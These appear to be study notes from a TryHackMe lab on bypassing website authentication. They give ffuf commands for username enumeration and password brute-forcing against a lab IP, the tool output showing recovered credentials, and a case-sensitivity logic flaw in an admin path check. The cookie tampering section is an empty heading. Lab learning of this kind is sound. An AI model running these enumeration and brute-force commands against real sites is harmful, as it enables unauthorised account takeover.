# Bypassing website authentication methods
In order to find accounts that we can try to hack into, we have to enumerate for all valid usernames 

## Username enumeration
We can use `ffuf` to fuzz for valid usernames. The command looks like this:<br>

`user@tryhackme$ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.49.132.233/customers/signup -mr "username already exists"`<br>

- -w is the wordlist of all common usernames
- -X specifies the request method, the default is GET
- -d specifies the data we are going to send
- -H specifies additional headers to the request (tells the web server we are sending form data)
- -u is the URL we are making the request to
- -mr is 'match regex', which tells ffuf to only display results that has the string specified

```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : POST
 :: URL              : http://10.49.132.233/customers/signup
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Usernames/Names/names.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ&email=x&password=x&cpassword=x
 :: Output file      : valid_usernames.txt
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Regexp: username already exists
________________________________________________

admin                   [Status: 200, Size: 3720, Words: 992, Lines: 77]
robert                  [Status: 200, Size: 3720, Words: 992, Lines: 77]
simon                   [Status: 200, Size: 3720, Words: 992, Lines: 77]
steve                   [Status: 200, Size: 3720, Words: 992, Lines: 77]
:: Progress: [10164/10164] :: Job [1/1] :: 591 req/sec :: Duration: [0:00:18] :: Errors: 0 ::
```
Then, store the found usernames into a file (eg valid_usernames.txt)

## Password brute force
Afterwards, we use brute force to test a list of commonly used passwords against the list of usernames: <br>

`user@tryhackme$ ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.49.132.233/customers/login -fc 200`<br>

Since we are using more than one wordlist, we can't just use the `FUZZ` keyword any longer. We specify `w1` and `w2` for the username and password wordlist, with a comma in `-w` to separate them. <br> 

`-fc` means "filter by status code". We are filtering out all status code 200 replies.<br>

```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : POST
 :: URL              : http://10.49.132.233/customers/login
 :: Wordlist         : w1: valid_usernames.txt
 :: Wordlist         : w2: /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=w1&password=w2
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 200
________________________________________________

[Status: 302, Size: 0, Words: 1, Lines: 1]
    * w2: thunder
    * w1: steve

:: Progress: [400/400] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```
## Logic flaw
<img width="907" height="449" alt="image" src="https://github.com/user-attachments/assets/b54a4fe9-5c1f-4b31-85c8-cfb27db04f8f" /><br>

As seen in the image, a logic flaw is a flaw where an attacker can skip the normal authentication procedures to gain access.<br>

(Copied from TryHackMe) The below mock code example checks to see whether the start of the path the client is visiting begins with /admin and if so, then further checks are made to see whether the client is, in fact, an admin. If the page doesn't begin with /admin, the page is shown to the client. <br>

```
if( url.substr(0,6) === '/admin') {
    # Code to check user is an admin
} else {
    # View Page
}
```
the php code uses the 3 equal signs, meaning that it must be an exact match in order to trigger the code to check admin. This presents a logic flaw, as an unauthenticated user can type "/aDMin" and completely bypass privilege checking, showing the page to them!

## Cookie tampering


